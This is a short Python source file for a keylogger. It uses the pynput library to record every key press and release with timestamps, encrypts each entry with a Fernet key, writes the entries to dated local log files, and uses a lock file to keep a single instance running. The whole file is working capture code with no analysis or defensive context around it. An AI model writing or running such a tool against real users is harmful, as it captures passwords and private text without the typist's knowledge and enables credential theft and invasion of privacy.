from pynput import keyboard
import time
import os
import sys
from datetime import datetime
from cryptography.fernet import Fernet

lock_file = "keylogger.lock"

if os.path.exists(lock_file):
    print("Keylogger already running. Exiting...")
    sys.exit()

with open(lock_file, "w") as f:
    f.write("Running")

with open("secret.key", "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)

log_file = f"log_{datetime.now().strftime('%Y_%m_%d_%H_%M')}.txt"

def on_press(key):
    try:
        key_data = f"{time.ctime()} - PRESSED - {key.char}\n"
    except AttributeError:
        key_data = f"{time.ctime()} - PRESSED - {key}\n" 
    
    with open(log_file, "ab") as f:
        encrypted = fernet.encrypt(key_data.encode())
        f.write(encrypted + b"\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Exiting....")
        return False
    else:
        released_key = f"{time.ctime()} - RELEASED - {key}\n"

        with open(log_file, "ab") as f:
            encrypted = fernet.encrypt(released_key.encode())
            f.write(encrypted + b"\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

os.remove(lock_file)